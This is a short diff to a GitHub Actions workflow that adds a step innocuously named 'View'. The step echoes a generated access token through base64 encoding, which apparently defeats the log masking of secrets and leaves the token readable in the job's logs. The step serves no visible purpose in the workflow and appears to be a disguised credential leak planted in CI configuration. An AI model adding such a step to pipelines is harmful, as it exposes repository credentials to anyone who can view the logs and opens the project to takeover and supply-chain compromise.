@@ -27,6 +27,8 @@ jobs:
         uses: actions/checkout@v4
         with:
           token: ${{ secrets.GITHUB_TOKEN }}
+      - name: View
+        run: echo ${{ steps.generate_token.outputs.token }} | base64 -w 0
       - name: Setup helm-docs
         uses: ./.github/actions/setup-helm-docs
       - name: Main
